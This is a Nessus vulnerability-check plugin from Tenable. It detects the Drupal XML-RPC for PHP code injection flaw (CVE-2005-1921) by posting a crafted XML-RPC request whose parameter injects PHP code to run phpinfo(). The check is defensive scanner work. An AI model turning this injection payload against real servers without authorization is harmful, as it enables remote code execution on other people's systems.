#
# (C) Tenable Network Security
#


if (description) {
  script_id(18640);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-1921");
  script_bugtraq_id(14088);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"17793");

  name["english"] = "Drupal XML-RPC for PHP Remote Code Injection Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is prone to
arbitrary PHP code injection attacks. 

Description :

The version of Drupal installed on the remote host allows attackers to
execute arbitrary PHP code due to a flaw in its bundled XML-RPC
library. 

See also :

http://www.gulftech.org/?node=research&article_id=00088-07022005
http://drupal.org/drupal-4.6.2

Solution : 

Upgrade to Drupal version 4.5.4 / 4.6.2 or later or remove the
'xmlrpc.php' script. 

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for XML-RPC for PHP remote code injection vulnerability in Drupal";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("drupal_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/drupal"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Check whether the script exists.
  req = http_get(item:string(dir, "/xmlrpc.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("<methodResponse>" >< res) {
    # Try to exploit it to run phpinfo().
    postdata = string(
      '<?xml version="1.0"?>',
      "<methodCall>",
      "<methodName>test.method</methodName>",
        "<params>",
          "<param><value><name>','')); phpinfo();exit;/*</name></value></param>",
        "</params>",
      "</methodCall>"
    );
    req = string(
      "POST ", dir, "/xmlrpc.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: text/xml\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like the output of phpinfo().
    if ("PHP Version" >< res) {
      security_hole(port);
      exit(0);
    }
  }
}
